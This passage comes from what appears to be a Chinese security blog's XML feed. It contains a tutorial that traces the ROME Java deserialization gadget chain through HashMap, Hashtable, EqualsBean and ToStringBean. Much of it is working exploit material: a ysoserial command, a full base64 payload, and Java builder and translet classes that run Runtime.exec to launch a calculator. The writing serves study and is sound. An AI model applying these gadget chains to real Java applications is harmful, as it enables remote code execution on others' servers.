文件提权</p><p>这里的pspy64可以进行进程的查看(不用root权限)，刚好可以进行判断是否存在定时提权</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub——DriftingBlues-5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化-Rome</title>
      <link href="/posts/a91085da.html"/>
      <url>/posts/a91085da.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1145">参考文章</a></p><p>从零开始分析</p><p>ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。</p><p>Rome 提供了 <strong>ToStringBean</strong> 这个类，提供深入的 toString 方法对JavaBean进行操作。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Idea 新建一个Maven项目</p><p>这里直接到maven包就行了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.28.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>新建一个demo来进行触发漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64_exp</span> <span class="operator">=</span> <span class="string">&quot;BASE64_STRING&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] exp =  Base64.getDecoder().decode(base64_exp);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508140800599.png" alt="image-20230508140800599"></p><p>然后关掉 IDEA 的 toString 对象视图, 因为该选项会默认调用实例方法的 toString, 并且会忽略 toString 中设置的断点, 而 ROME 链涉及到 ToStringBean 的 toString 方法</p><p><img src="../images/image-20230508141203769.png" alt="image-20230508141203769"></p><p>利用<code>ysoserial</code>生成弹计算器的<code>payload</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME <span class="string">&#x27;calc&#x27;</span>|base64</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAaeyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEABGNhbGMIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBACB5c29zZXJpYWwvUHduZXIxNjM4NzExMzMzOTc4NzU0MQEAIkx5c29zZXJpYWwvUHduZXIxNjM4NzExMzMzOTc4NzU0MTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABcAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu+X2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB+AAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFHNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHEwABF9vYmpxAH4ACXhwcQB+AB9xAH4AFHNxAH4AG3ZxAH4AAnEAfgANc3EAfgAgcQB+ACNxAH4ADXEAfgAGcQB+AAZxAH4ABng=</span><br></pre></td></tr></table></figure><p>然后放入Poc.java里的string    然后进行运行就可以弹出计算器了</p><p><img src="../images/image-20230427213256355.png" alt="image-20230427213256355"></p><p>现在可以对这条链子进行分析</p><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>老样子我们先去<code>ysoserial</code>中看一下调用链的顺序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">* NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* Method.invoke(Object, Object...)</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line"></span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p>最上面的是链子的末尾，最下面的是链子的开头</p><p>在HashMap的readObject里面</p><p><img src="../images/image-20230508144332422.png" alt="image-20230508144332422"></p><p>使用了putVal()方法，然后里面嵌=嵌套着一个hash法，先去看看hash()方法</p><p><img src="../images/image-20230508144501904.png" alt="image-20230508144501904"></p><p>会调用hashcode()方法  这里的key就是ObjectBean这个类了</p><p>然后就在这个类的hashcode()处打个断点</p><p><img src="../images/image-20230508145415802.png" alt="image-20230508145415802"></p><p>然后就开始调试</p><p><img src="../images/image-20230508145754594.png" alt="image-20230508145754594"></p><p>ObjectBean.hashcode调用了EqualsBean.beanHashCode方法</p><p><img src="../images/image-20230508150028029.png" alt="image-20230508150028029"></p><p>然后EqualsBean.beanHashCode又调用了ObjectBean.toString方法  这里的ObjectBean和开头的那个调用hashcode的ObjectBean是同一个类</p><p><img src="../images/image-20230508150156149.png" alt="image-20230508150156149"></p><p>ObjectBean.toString方法又调用了ToStringBean.toString()方法</p><p><img src="../images/image-20230508150301354.png" alt="image-20230508150301354"></p><p>然后跟进这个ToStringBean.toString()这个方法里面</p><p><img src="../images/image-20230508150422220.png" alt="image-20230508150422220"></p><p>在 toString 内部会获取 <code>this._obj</code> 的 Class 对象并获取其名称, 然后设置 prefix 为全类名的最后一位 (即 TemplatesImpl), 并在 return 时调用 <code>this.toString(prefix)</code> 这个重载方法</p><p>然后到TemplatesImpl.toString（）方法</p><p><img src="../images/image-20230508150654399.png" alt="image-20230508150654399"></p><p>方法内部先通过 <code>BeanIntrospector.getPropertyDescriptors()</code> 获取 <code>this._beanClass</code> 的 JavaBean, 然后遍历 getter, 判断其是否由 Object 类声明, 并且是否无参, 最后调用这个无参的 getter</p><p>再往下就是 TemplatesImpl 的内容了, 很容易想到它的 <code>_outputProperties</code> 属性存在 getOutputProperties 这个 getter, 并且在里面调用了 newTransformer 方法, 经过一系列调用最终加载 Java 字节码并执行它的无参构造方法</p><p>总的来说利用链还是比较简单的, 就是 ObjectBean EqualsBean ToStringBean 之间的相互调用</p><p> <strong>这里的话之后就是TemplatesImpl实例化恶意类的流程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl--&gt;getOutputProperties()</span><br><span class="line">TemplatesImpl--&gt;newTransformer()</span><br><span class="line">        TemplatesImpl--&gt;getTransletInstance()</span><br><span class="line">            TemplatesImpl--&gt;defineTransletClasses()</span><br><span class="line">                TemplatesImpl--&gt;defineClass()</span><br></pre></td></tr></table></figure><h3 id="HashTable利用链"><a href="#HashTable利用链" class="headerlink" title="HashTable利用链"></a>HashTable利用链</h3><p>这条链子实际上就是在<strong>HashMap</strong>被ban的情况下进行反序列化，因为最终目的始终都是调用<strong>hashcode</strong>函数，而HashTbale中刚好调用了<strong>hashcode</strong>，因此仍然可以触发整套流程</p><p><img src="../images/image-20230508160704668.png" alt="image-20230508160704668"></p><p>这个HashTable里面的readObject方法，里面有一个key,然后这里面又有一个reconstitutionPut()方法，跟进这个方法</p><p><img src="../images/image-20230508160835775.png" alt="image-20230508160835775"></p><p>那么就可以利用这个来替换掉HashMap了</p><p>那么利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">Method.invoke(Object, Object...)</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">Hashtable&lt;K,V&gt;.reconstitutionPut(Entry&lt;?,?&gt;[], K, V)</span><br><span class="line">Hashtable&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p>这里话EqualsBean换成ObjectBean也行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Hello.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;cls.getBytes()&#125;, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        ht.put(equalsBean, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>(), templatesImpl);</span><br><span class="line"></span><br><span class="line">        Serialization.test(ht);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(String name, Object value, Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hello.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508161225081.png" alt="image-20230508161225081"></p><h3 id="EqualsBean"><a href="#EqualsBean" class="headerlink" title="EqualsBean"></a>EqualsBean</h3><p>接下来我们来看这个类的定义</p><p><img src="../images/image-20230508162335613.png" alt="image-20230508162335613"></p><p><img src="../images/image-20230508162402274.png" alt="image-20230508162402274"></p><p>EqualsBean 刚好也存在 hashCode, 并且也能调用 <code>this._obj</code> 的 toString</p><p>那么这里就可以指定 <code>this._obj</code> 为 ToStringBean</p><p>这里的话在EqualsBean这个类的定义处就可以指定了</p><p>ToStringBean 的构造方法</p><p><img src="../images/image-20230508163433188.png" alt="image-20230508163433188"></p><p>我们指定 <code>_beanClass</code> 为 Templates.class, <code>_obj</code> 为 TemplatesImpl</p><p>这里为什么指定这些呢，这是在刚开始对ysoserial给的exp的时候，我们来完整跟了一遍，然后得到的参数</p><p>等下接下来的各种链子都是一样的道理</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">Method.invoke(Object, Object...)</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p><strong>paylaod</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 